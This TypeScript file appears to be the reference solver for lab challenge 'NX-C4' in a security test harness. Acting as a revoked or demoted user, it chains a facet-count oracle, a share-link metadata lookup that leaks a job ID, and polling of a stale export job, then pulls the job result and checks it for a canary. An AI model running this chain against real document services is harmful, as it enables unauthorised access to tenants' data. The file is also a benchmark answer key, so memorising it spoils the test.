// NX-C4 reference solver: facet count oracle -> share metadata handle -> stale export job poll ->
// artifact exfiltration.
import type { CompositeProofReceipt } from '../../../lib/types.ts'
import type { SolverContext } from './context.ts'

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

export async function solveC4(ctx: SolverContext): Promise<CompositeProofReceipt | null> {
  const plan = ctx.lab.plan
  const prefix = plan.routePrefix
  const token = await ctx.login('revoked_or_demoted')
  const tenant = encodeURIComponent(plan.tenants.a.slug)

  let folder = ''
  for (const candidate of plan.nexus.folderCandidates) {
    const facets = await ctx.http('api', `${prefix}/search/facets?tenant=${tenant}&q=${encodeURIComponent(candidate)}`, { token })
    if (facets.status !== 200) continue
    if (facets.json<{ count: number }>().count > 0) {
      folder = candidate
      break
    }
  }
  if (!folder) return null

  const metadata = await ctx.http('api',
    `${prefix}/docs/share/${plan.nexus.shareLinkId}/metadata?folder=${encodeURIComponent(folder)}`,
    { token },
  )
  if (metadata.status !== 200) return null
  const jobId = metadata.json<{ jobId?: string }>().jobId
  if (!jobId) return null

  let ready = false
  for (let attempt = 0; attempt < 100; attempt++) {
    const polled = await ctx.http('docs-worker', `/jobs/${jobId}`)
    if (polled.status !== 200) return null
    const job = polled.json<{ job: { status: string } }>().job
    if (job.status === 'ready') {
      ready = true
      break
    }
    if (job.status === 'failed' || job.status === 'cancelled') return null
    await sleep(20)
  }
  if (!ready) return null

  const result = await ctx.http('docs-worker', `/jobs/${jobId}/result`)
  if (result.status !== 200 || !result.text.includes(plan.nexus.canary)) return null

  return ctx.confirm('NX-C4')
}
